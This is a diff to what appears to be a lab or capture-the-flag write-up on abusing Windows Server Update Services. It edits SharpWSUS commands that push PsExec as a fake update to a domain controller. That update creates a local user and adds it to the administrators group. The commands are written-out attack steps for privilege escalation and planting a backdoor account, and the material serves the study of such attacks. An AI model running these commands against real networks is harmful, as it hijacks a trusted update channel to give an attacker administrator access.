@@ -42,9 +42,11 @@ Unassigned Computers
 
 
 ```bash
-SharpWSUS_update.exe create /payload:"c:\_install\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c \"net user WSUSDemo Password123! /add\"" /title:"WSUSDemo1"
-SharpWSUS_update.exe approve /updateid:c59e59aa-1847-40c1-bdf1-7ac122c8c822 /computername:dc.tea.vl /groupname:"Demo Group1"
+SharpWSUS_update.exe create /payload:"c:\_install\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c \"net user WSUSDemo Password123! /add\""
 
-SharpWSUS_update.exe create /payload:"c:\_install\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c \"net localgroup administrators WSUSDemo /add\"" /title:"WSUSDemo2"
-SharpWSUS_update.exe approve /updateid:c59e59aa-1847-40c1-bdf1-7ac122c8c822 /computername:dc.tea.vl /groupname:"Demo Group2"
+SharpWSUS_update.exe approve /updateid:cf6d1ebd-6d2d-4540-8b69-d0394057004b /computername:dc.tea.vl /groupname:"Awesome Group C2"
+
+SharpWSUS_update.exe create /payload:"c:\_install\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c \"net localgroup administrators WSUSDemo /add\""
+
+SharpWSUS_update.exe approve /updateid:372da223-6f5c-4428-8520-0c42a3a8eb54 /computername:dc.tea.vl /groupname:"Awesome Group C4"
 ```
